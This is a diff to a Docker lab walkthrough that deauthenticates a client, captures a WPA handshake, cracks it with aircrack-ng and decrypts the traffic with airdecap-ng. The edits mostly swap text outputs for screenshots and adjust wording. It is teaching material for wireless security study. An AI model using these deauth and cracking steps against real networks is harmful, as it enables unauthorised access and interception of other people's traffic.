@@ -106,6 +106,8 @@ docker exec -it attacker bash
 docker exec -it attacker bash
 ```
 
+Also its better to connect to the client docker and pin 10.0.0.1 to see it works and also to be some extra traffic
+
 ---
 
 ## Step 3 — Start capturing on the AP's channel
@@ -159,6 +161,9 @@ Expected output:
 
 ![alt text](images/image4.1.png)
 
+Also we can see the connection beign broken in the pings:
+![alt text](images/image4.2.png)
+
 ### What is happening under the hood
 
 `aireplay-ng` crafts raw 802.11 management frames:
@@ -208,7 +213,7 @@ You should see:
 
 ## Step 6 — Build a wordlist
 
-For the lab, a tiny wordlist containing the right answer keeps things instant:
+We can create a tiny wordlist containing the right answer keeps things instant:
 
 ```bash
 cat > /tmp/wordlist.txt <<EOF
@@ -234,19 +239,7 @@ aircrack-ng -w /tmp/wordlist.txt \
             /tmp/capture/handshake-01.cap
 ```
 
-Expected:
-
-```
-                  Aircrack-ng 1.7
-
-      [00:00:00] 5/7 keys tested (1234.56 k/s)
-
-                  KEY FOUND! [ supersecretpass ]
-
-      Master Key    : A1 B2 C3 D4 ...
-      Transient Key : 11 22 33 44 ...
-      EAPOL HMAC    : DE AD BE EF ...
-```
+![alt text](images/image7.1.png)
 
 ### What `aircrack-ng` is doing per candidate
 
@@ -272,42 +265,23 @@ airdecap-ng -e TestWiFi \
 
 Expected:
 
-```
-Total number of WPA data packets     412
-Number of decrypted WPA  packets     412
-```
+![alt text](images/image8.1.png)
+
+The frames that are not decrypted are the ones sent before
 
 A new file appears next to the original: `handshake-01-dec.cap`.
 
 Inspect plaintext traffic:
 
 ```bash
-tshark -r /tmp/capture/handshake-01-dec.cap -Y "icmp or arp" | head -30
-```
-
-Or copy it out and open it in Wireshark on the host:
-
-```bash
-docker cp attacker:/tmp/capture/handshake-01-dec.cap ./decrypted.cap
-wireshark ./decrypted.cap
+tcpdump -r /tmp/capture/handshake-01-dec.cap -nn "icmp or arp" | head -30
 ```
 
 Every frame on the "secure" Wi-Fi is now readable.
 
----
+![alt text](images/image8.2.png)
 
-## Step 9 — Generate more interesting traffic (optional)
-
-To make the decrypted capture more visually convincing, generate some traffic from the client *before* the deauth:
-
-```bash
-docker exec client sh -c "ping -c 20 10.0.0.1 &"
-docker exec client sh -c "echo hello | nc -u -w1 10.0.0.1 9999 || true"
-```
-
-Then run Steps 3 → 8 again. ICMP echoes and the UDP payload `hello` will be visible in the decrypted file.
-
----
+![alt text](image.png)
 
 ## Cleanup between runs
 
